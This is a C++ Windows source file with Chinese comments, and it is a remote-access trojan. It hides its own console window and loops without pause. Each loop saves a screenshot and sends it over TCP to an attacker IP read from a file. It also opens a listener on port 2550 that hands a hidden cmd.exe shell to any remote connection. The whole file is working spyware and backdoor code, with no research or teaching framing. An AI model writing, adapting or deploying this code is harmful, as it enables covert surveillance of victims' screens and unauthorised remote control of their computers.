#pragma comment(lib, "ws2_32.lib") 
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <thread>
#include <ws2tcpip.h> // 為 inet_pton 等

#define MasterPort 2550
#define wait_ms 0
#define SERVER_PORT 8080

char SERVER_IP[256] = {0};

bool LoadServerIP(const char* filename) {
    FILE* file = fopen(filename, "r");
    if (!file) return false;

    fgets(SERVER_IP, sizeof(SERVER_IP), file);

    size_t len = strlen(SERVER_IP);
    if (len > 0 && (SERVER_IP[len - 1] == '\n' || SERVER_IP[len - 1] == '\r')) {
        SERVER_IP[len - 1] = '\0';
    }

    fclose(file);
    return true;
}

const char* bmpPath = "C:\\Users\\Public\\Pictures\\screen.bmp";

void SaveBitmapToFile(HBITMAP hBitmap, HDC hDC, LPCSTR filename) {
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    int bmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    char* bmpData = new char[bmpSize];

    GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, bmpData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    FILE* file = fopen(filename, "wb");
    if (!file) return;

    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, file);
    fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);
    fwrite(bmpData, bmpSize, 1, file);

    fclose(file);
    delete[] bmpData;
}

void CaptureScreenToBMP(const char* filename) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    SaveBitmapToFile(hBitmap, hMemoryDC, filename);

    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}

void SendFile(const char* filename) {
    FILE* file = fopen(filename, "rb");
    if (!file) return;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (server.sin_addr.s_addr == INADDR_NONE) {
        // IP 無效
        fclose(file);
        closesocket(s);
        WSACleanup();
        return;
    }

    if (connect(s, (sockaddr*)&server, sizeof(server)) != SOCKET_ERROR) {
        char buffer[1024];
        int bytesRead;
        while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
            send(s, buffer, bytesRead, 0);
        }
    }

    fclose(file);
    closesocket(s);
    WSACleanup();
}

void ScreenThread() {
    while (true) {
        CaptureScreenToBMP(bmpPath);
        SendFile(bmpPath);
        Sleep(wait_ms);
    }
}

int main(int argc, char *argv[]) {
    if (!LoadServerIP("ip.txt")) { return 1; }

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    std::thread screenCaptureThread(ScreenThread);
    screenCaptureThread.detach();

    WSADATA WSADa;
    sockaddr_in SockAddrIn;
    SOCKET CSocket, SSocket;
    int iAddrSize;
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFOW StartupInfo;
    wchar_t* szCMDPath = new wchar_t[256];

    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
    ZeroMemory(&WSADa, sizeof(WSADATA));

    GetEnvironmentVariableW(L"COMSPEC", szCMDPath, 256);

    WSAStartup(0x0202, &WSADa);

    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;  // ? 任何 IP 都可以連入
    SockAddrIn.sin_port = htons(MasterPort);

    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));
    listen(CSocket, 5);
    iAddrSize = sizeof(SockAddrIn);

    while ((SSocket = accept(CSocket, (sockaddr *)&SockAddrIn, &iAddrSize))) {
        StartupInfo.cb = sizeof(STARTUPINFOW);
        StartupInfo.wShowWindow = SW_HIDE;
        StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        StartupInfo.hStdInput = (HANDLE)SSocket;
        StartupInfo.hStdOutput = (HANDLE)SSocket;
        StartupInfo.hStdError = (HANDLE)SSocket;

        CreateProcessW(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);

        WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
        CloseHandle(ProcessInfo.hProcess);
        CloseHandle(ProcessInfo.hThread);
        closesocket(SSocket);
    }

    closesocket(CSocket);
    WSACleanup();
    delete[] szCMDPath;
    return 0;
}
